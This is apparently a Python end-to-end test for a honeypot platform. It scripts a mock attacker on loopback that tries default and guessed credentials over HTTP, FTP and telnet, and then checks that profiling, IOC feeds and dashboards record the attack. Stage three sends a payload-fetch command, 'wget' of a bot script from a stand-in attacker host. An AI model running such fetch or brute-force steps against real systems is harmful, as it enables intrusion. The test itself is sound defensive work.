"""End-to-end integration test: a full attack against a live fleet.

Starts a real multi-service deployment on loopback, drives a scripted
"attacker" through HTTP, FTP, telnet and redis, then verifies the whole
intelligence pipeline: canary alerts fire, the attacker is profiled and
classified, IOC feeds export, the dashboard renders, and the session
records and replays. Everything runs on ephemeral ports with short
timeouts.
"""

import json
import socket
import time

from honeypot_server.canary.tokens import CanaryTokenFactory
from honeypot_server.core.persona import Persona
from honeypot_server.core.server import HoneypotManager
from honeypot_server.intel.attacker import AttackerTracker, classify
from honeypot_server.intel.dashboard import render_html_report, render_terminal
from honeypot_server.intel.feeds import build_blocklist, build_stix_bundle
from honeypot_server.intel.replay import SessionRecorder, replay_session

PERSONA = Persona.generate(101)


def _free_port() -> int:
    probe = socket.socket()
    probe.bind(("127.0.0.1", 0))
    port = probe.getsockname()[1]
    probe.close()
    return port


def _wait_for(log, needle, timeout=4.0):
    deadline = time.time() + timeout
    while time.time() < deadline:
        if log.exists() and needle in log.read_text(encoding="utf-8"):
            return True
        time.sleep(0.05)
    return False


def _recv_all(sock, timeout=2.0) -> bytes:
    sock.settimeout(timeout)
    chunks = []
    while True:
        try:
            data = sock.recv(4096)
        except (socket.timeout, TimeoutError):
            break
        if not data:
            break
        chunks.append(data)
    return b"".join(chunks)


def test_full_attack_pipeline(tmp_path):
    log = tmp_path / "integration.jsonl"
    manager = HoneypotManager(log, host="127.0.0.1", persona=PERSONA)
    manager.add("http", _free_port())
    manager.add("ftp", _free_port())
    manager.add("telnet", _free_port())
    manager.add("redis", _free_port())
    manager.start()

    # plant one canary token across the fleet
    factory = CanaryTokenFactory(seed=55, domain=PERSONA.domain)
    aws = factory.aws_key()
    factory.attach(manager.canaries)

    try:
        http_port = manager.records["http"].port
        ftp_port = manager.records["ftp"].port
        telnet_port = manager.records["telnet"].port
        redis_port = manager.records["redis"].port

        # --- stage 1: HTTP recon + credential theft -------------------------
        s = socket.create_connection(("127.0.0.1", http_port), timeout=3)
        s.sendall(b"GET /login HTTP/1.1\r\nHost: x\r\n\r\n")
        _recv_all(s)
        s.close()
        body = b"user=admin&pass=hunter2"
        s = socket.create_connection(("127.0.0.1", http_port), timeout=3)
        s.sendall(b"POST /login HTTP/1.1\r\nHost: x\r\n"
                  b"Content-Type: application/x-www-form-urlencoded\r\n"
                  b"Content-Length: " + str(len(body)).encode() +
                  b"\r\n\r\n" + body)
        _recv_all(s)
        s.close()

        # --- stage 2: FTP brute force ---------------------------------------
        s = socket.create_connection(("127.0.0.1", ftp_port), timeout=3)
        s.settimeout(3)
        s.recv(256)  # banner
        for i in range(3):
            s.sendall(f"USER admin\r\nPASS guess{i}\r\n".encode())
            time.sleep(0.05)
            s.recv(4096)
        s.close()

        # --- stage 3: telnet compromise + staging ----------------------------
        s = socket.create_connection(("127.0.0.1", telnet_port), timeout=3)
        s.settimeout(3)
        buf = b""
        while b"login: " not in buf:
            buf += s.recv(4096)
        s.sendall(b"root\r\n")
        while b"Password: " not in buf:
            buf += s.recv(4096)
        buf = b""
        s.sendall(b"toor\r\n")
        while b"$ " not in buf:
            buf += s.recv(4096)
        buf = b""
        s.sendall(b"wget http://evil.example/bot.sh\r\n")
        while b"$ " not in buf:
            buf += s.recv(4096)
        s.close()

        # --- stage 4: redis probe using the planted canary key ---------------
        s = socket.create_connection(("127.0.0.1", redis_port), timeout=3)
        s.sendall(b"*2\r\n$4\r\nAUTH\r\n$" + str(len(aws.value)).encode()
                  + b"\r\n" + aws.value.encode() + b"\r\n")
        _recv_all(s)
        s.close()

        # --- wait for the log to settle --------------------------------------
        assert _wait_for(log, "credential_capture")
        assert _wait_for(log, "malware_staging")
        assert _wait_for(log, "canary_hit")

        events = list(json.loads(line) for line in
                      log.read_text(encoding="utf-8").splitlines() if line)

        # --- intel: profiling -------------------------------------------------
        tracker = AttackerTracker()
        tracker.observe_all(events)
        assert len(tracker.profiles) == 1  # one attacker IP end to end
        profile = tracker.top(1)[0]
        assert profile.ip == "127.0.0.1"
        assert classify(profile) == "canary-tripper"
        ttp_ids = [t["id"] for t in tracker.report()["profiles"][profile.ip]["ttps"]]
        assert "T1110.001" in ttp_ids  # brute force observed
        assert "T1105" in ttp_ids      # ingress tool transfer

        # --- intel: feeds -------------------------------------------------------
        blocklist = build_blocklist(events, allowlist={"127.0.0.1"})
        assert blocklist == ""  # loopback is allowlisted by policy
        bundle = build_stix_bundle(events)
        assert bundle["type"] == "bundle"

        # --- intel: dashboards ----------------------------------------------------
        terminal = render_terminal(events, color=False)
        assert "HONEYPOT DASHBOARD" in terminal
        html = render_html_report(events, title="Integration")
        assert "Top attackers" in html

        # --- intel: record + replay -------------------------------------------------
        recorder = SessionRecorder()
        recorder.observe_all(events)
        assert len(recorder.sessions) >= 3  # http, ftp, telnet, redis
        replayed = []
        ftp_sessions = [r for r in recorder.export() if r["service"] == "ftp"]
        assert ftp_sessions
        n = replay_session(ftp_sessions[0], replayed.append)
        assert n == len(ftp_sessions[0]["events"])
        assert all(e["replay"] for e in replayed)

        # --- health ---------------------------------------------------------------
        health = manager.health_check(timeout=1.0)
        assert all(health.values())
    finally:
        manager.stop_all()

    # after shutdown nothing answers
    health = manager.health_check(timeout=0.3)
    assert all(v is False for v in health.values())
